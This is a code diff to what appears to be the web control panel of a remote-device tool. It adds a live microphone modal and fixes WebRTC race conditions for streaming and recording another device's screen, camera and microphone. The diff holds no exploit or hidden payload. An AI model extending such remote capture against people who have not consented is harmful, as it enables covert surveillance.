@@ -1669,6 +1669,21 @@
                     id="cameraCloseBtn" class="close-btn">✕</button></div>
         </div>
     </div>
+    <div id="audioModalOverlay" class="modal-overlay">
+        <div class="mobile-popup">
+            <div class="phone-frame" style="background: linear-gradient(135deg, #1e293b, #0f172a); flex-direction: column;">
+                <div style="text-align: center; color: white;">
+                    <div style="font-size: 64px; margin-bottom: 20px;">🎤</div>
+                    <div style="font-size: 18px; font-weight: 500;">Live Audio Streaming</div>
+                    <div style="font-size: 14px; color: #94a3b8; margin-top: 8px;">Device Microphone Active</div>
+                </div>
+                <audio id="modalAudioPlayer" autoplay playsinline style="display:none;"></audio>
+            </div>
+            <div class="popup-controls">
+                <button id="audioRecordBtn">🔴</button>
+                <button id="audioCloseBtn" class="close-btn">✕</button>
+            </div>
+        </div>
     </div>
     <div id="managementModal">
         <div class="management-box">
@@ -2052,18 +2067,23 @@
             if (msg.type === 'ANSWER') {
                 const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC;
                 if (pc) {
+                    if (pc.signalingState !== 'have-local-offer') {
+                        console.warn(`${msg.streamType} ignored ANSWER: State is ${pc.signalingState}`);
+                        return;
+                    }
                     pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: msg.sdp }))
                         .then(() => console.log(`${msg.streamType} remote description set`))
                         .catch(err => {
                             console.error(`${msg.streamType} setRemoteDescription error:`, err);
                             showNotification(`RTC Error: ${err.message}`);
+                            // If it failed due to state, it might have been a race condition
                         });
                 }
             } else if (msg.type === 'ICE_CANDIDATE') {
                 const pc = msg.streamType === 'screen' ? screenPC : msg.streamType === 'camera' ? cameraPC : audioPC;
-                if (pc && msg.candidate) {
+                if (pc && msg.candidate && pc.signalingState !== 'closed') {
                     pc.addIceCandidate(new RTCIceCandidate(msg.candidate))
-                        .catch(err => console.warn('addIceCandidate error:', err));
+                        .catch(err => console.warn(`${msg.streamType} addIceCandidate error:`, err));
                 }
             }
         }
@@ -2080,22 +2100,27 @@
                 const modalVideo = document.getElementById('modalScreenVideo');
                 if (modalVideo) modalVideo.srcObject = null;
             } else {
+                const btn = document.getElementById('screenBtn');
+                if (btn && btn.disabled) return;
+                
                 document.getElementById('screenModalOverlay').classList.add('show');
                 document.body.classList.add('modal-open');
-                const modalVideo = document.getElementById('modalScreenVideo');
-                if (modalVideo) modalVideo.srcObject = null;
+                
+                if (btn) { btn.innerText = '⌛ Connecting...'; btn.disabled = true; }
+                
+                if (screenPC) screenPC.close();
                 screenPC = createPeerConnection('screen', e => {
                     const modalVideo = document.getElementById('modalScreenVideo');
                     if (modalVideo && e.streams[0]) {
                         modalVideo.srcObject = e.streams[0];
                         console.log('Screen stream received');
                     }
+                    if (btn) { btn.innerText = 'Stop Screen'; btn.disabled = false; }
                 }, false);
                 try {
                     const offer = await screenPC.createOffer();
                     await screenPC.setLocalDescription(offer);
                     sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'screen' });
-                    document.getElementById('screenBtn').innerText = 'Stop Screen';
                     screenActive = true;
                     screenMediaRecorder = null;
                     screenRecordedChunks = [];
@@ -2103,7 +2128,9 @@
                 } catch (e) {
                     console.error('Screen share failed:', e);
                     showNotification('Failed: ' + e.message);
+                    if (screenPC) screenPC.close();
                     screenPC = null;
+                    if (btn) { btn.innerText = 'Start Screen'; btn.disabled = false; }
                     document.getElementById('screenModalOverlay').classList.remove('show');
                     document.body.classList.remove('modal-open');
                 }
@@ -2292,17 +2319,33 @@
         }
 
         async function startLiveCamera() {
+            const btn = document.getElementById('startLiveStreamBtn');
+            if (btn && btn.innerText.includes('Connecting')) return;
+            
             const camera = document.querySelector('input[name="liveCameraSelect"]:checked').value;
             const useFlash = document.getElementById('liveFlashCheckbox').checked;
             const useMic = document.getElementById('liveMicCheckbox').checked;
             
+            if (btn) { btn.innerText = '⌛ Connecting...'; btn.disabled = true; }
+            
             // Send immediate command alongside signaling
             if (useFlash && camera === 'back') sendCommand('FLASH_ON');
             
-            cameraPC = createPeerConnection('camera', e => showCameraModal(e.streams[0], camera, useFlash), useMic);
-            const offer = await cameraPC.createOffer();
-            await cameraPC.setLocalDescription(offer);
-            sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic });
+            if (cameraPC) cameraPC.close();
+            cameraPC = createPeerConnection('camera', e => {
+                showCameraModal(e.streams[0], camera, useFlash);
+                if (btn) { btn.innerText = 'Start Live'; btn.disabled = false; }
+            }, useMic);
+            
+            try {
+                const offer = await cameraPC.createOffer();
+                await cameraPC.setLocalDescription(offer);
+                sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'camera', camera, flash: useFlash, mic: useMic });
+            } catch (err) {
+                console.error('Camera offer error:', err);
+                showNotification(`Offer Failed: ${err.message}`);
+                if (btn) { btn.innerText = 'Start Live'; btn.disabled = false; }
+            }
         }
 
         function stopLiveStream() {
@@ -2316,33 +2359,52 @@
         function showAudioModal(stream) {
             const modal = document.getElementById('audioModalOverlay');
             const audio = document.getElementById('modalAudioPlayer');
+            const recordBtn = document.getElementById('audioRecordBtn');
+            const closeBtn = document.getElementById('audioCloseBtn');
+            
             audio.srcObject = stream;
             currentAudioStream = stream;
             modal.classList.add('show');
             document.body.classList.add('modal-open');
+            
             let recording = false, recorder = null, chunks = [];
-            document.getElementById('audioRecordBtn').onclick = () => {
-                if (recording && recorder) { recorder.stop(); document.getElementById('audioRecordBtn').innerText = '🔴'; recording = false; }
-                else {
+            
+            recordBtn.onclick = () => {
+                if (recording && recorder) {
+                    recorder.stop();
+                    recordBtn.innerText = '🔴';
+                    recordBtn.style.boxShadow = '';
+                    recording = false;
+                    showNotification('Audio recording stopped and downloaded');
+                } else {
                     chunks = [];
-                    recorder = new MediaRecorder(stream);
-                    recorder.ondataavailable = e => chunks.push(e.data);
-                    recorder.onstop = () => {
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const a = document.createElement('a');
-                        a.href = URL.createObjectURL(blob);
-                        a.download = `audio_${Date.now()}.webm`;
-                        a.click();
-                        URL.revokeObjectURL(blob);
-                    };
-                    recorder.start();
-                    recording = true;
-                    document.getElementById('audioRecordBtn').innerText = '🟢';
+                    try {
+                        recorder = new MediaRecorder(stream);
+                        recorder.ondataavailable = e => chunks.push(e.data);
+                        recorder.onstop = () => {
+                            const blob = new Blob(chunks, { type: 'audio/webm' });
+                            const a = document.createElement('a');
+                            a.href = URL.createObjectURL(blob);
+                            a.download = `audio_${Date.now()}.webm`;
+                            a.click();
+                            URL.revokeObjectURL(a.href);
+                        };
+                        recorder.start();
+                        recording = true;
+                        recordBtn.innerText = '⏺️';
+                        recordBtn.style.boxShadow = '0 0 15px #ef4444';
+                        showNotification('Recording audio...');
+                    } catch (e) {
+                        console.error('MediaRecorder error:', e);
+                        showNotification('Recording failed: ' + e.message);
+                    }
                 }
             };
-            document.getElementById('audioCloseBtn').onclick = () => {
+            
+            closeBtn.onclick = () => {
                 if (recorder && recorder.state === 'recording') recorder.stop();
                 if (stream) stream.getTracks().forEach(t => t.stop());
+                audio.srcObject = null;
                 modal.classList.remove('show');
                 document.body.classList.remove('modal-open');
                 stopLiveAudio();
@@ -2350,12 +2412,31 @@
         }
 
         async function startLiveAudio() {
-            audioPC = createPeerConnection('audio', e => showAudioModal(e.streams[0]), true);
-            const offer = await audioPC.createOffer();
-            await audioPC.setLocalDescription(offer);
-            sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
-            document.getElementById('liveAudioBtn').style.display = 'none';
-            document.getElementById('stopLiveAudioBtn').style.display = 'block';
+            const btn = document.getElementById('liveAudioBtn');
+            if (btn && btn.disabled) return;
+            
+            if (btn) { btn.innerText = '⌛...'; btn.disabled = true; }
+            
+            if (audioPC) audioPC.close();
+            audioPC = createPeerConnection('audio', e => {
+                showAudioModal(e.streams[0]);
+                if (btn) { 
+                    btn.innerText = '🎤 Live Audio'; 
+                    btn.disabled = false; 
+                    btn.style.display = 'none';
+                    document.getElementById('stopLiveAudioBtn').style.display = 'block';
+                }
+            }, true);
+            
+            try {
+                const offer = await audioPC.createOffer();
+                await audioPC.setLocalDescription(offer);
+                sendSignaling({ type: 'OFFER', sdp: offer.sdp, streamType: 'audio', mic: true });
+            } catch (err) {
+                console.error('Audio offer error:', err);
+                showNotification(`Offer Failed: ${err.message}`);
+                if (btn) { btn.innerText = '🎤 Live Audio'; btn.disabled = false; }
+            }
         }
 
         function stopLiveAudio() {
